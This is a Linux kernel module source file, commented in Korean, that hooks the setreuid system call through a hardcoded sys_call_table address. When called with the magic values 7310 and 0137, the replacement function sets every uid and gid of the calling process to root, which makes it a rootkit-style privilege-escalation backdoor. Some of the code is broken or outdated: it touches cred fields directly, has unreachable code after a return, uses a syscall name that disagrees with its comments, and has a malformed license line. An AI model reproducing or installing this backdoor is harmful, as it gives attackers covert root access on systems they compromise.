#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>

void **sys_call_table = (void **)0xffffffff820002a0;
// System.map에서 구한 시스템 콜 주소

asmlinkage int (*orig_setreuid)( uid_t ruid, uid_t euid );
// 원본 setreuid() 시스템 콜 주소를 가리키기 위한 함수 포인터

asmlinkage int hk_setreuid( uid_t ruid, uid_t euid )
// setreuid() 시스템 콜을 대신할 사용자 함수
{
  if( (ruid == 7310) && (euid == 0137) )
  // setreuid() 시스템 콜의 인자인 ruid와 euid가 각각 7310, 0137 인지 체크
  {
    printk( KERN_ALERT "[Correct]\n" );
    current -> uid = current -> gid = 0;
    current -> euid = current -> egid = 0;
    current -> suid = current -> sgid = 0;
    current -> fsuid = current -> fsgid = 0;
    // 현재 프로세스의 모든 권한을 root로 변경
    return orig_setreuid( 0 , 0 ); //
    setreuid( 0 , 0 );
  }

  return orig_setreuid( ruid , euid );
  // if문 조건에 만족하지 않을 경우 원래 시스템 콜 수행
}

int __init hk_init( void )
{
  orig_setreuid = sys_call_table[__NR_setreuid64];
  // 32bit 운영체제에서는 setreuid32() 시스템 콜이 호출하기 때문에
  // orig_setreuid 함수 포인터가 setreuid32() 시스템 콜을 가리키도록 지정.

  sys_call_table[__NR_setreuid64] = hk_setreuid;
  // setreuid32() 시스템 콜을 우리가 작성한 hk_setreuid() 함수로 대체

  printk( KERN_ALERT "Module init\n" );
  return 0;
}
void __exit hk_exit( void )
{
  sys_call_table[__NR_setreuid64] = orig_setreuid;
  // setreuid32() 시스템 콜을 원본 주소로 복구

  printk( KERN_ALERT "Module exit\n" );
}

module_init( hk_init );
// 초기화 함수 실행
module_exit( hk_exit );

//MODULE_LICENSE(*GPL*);
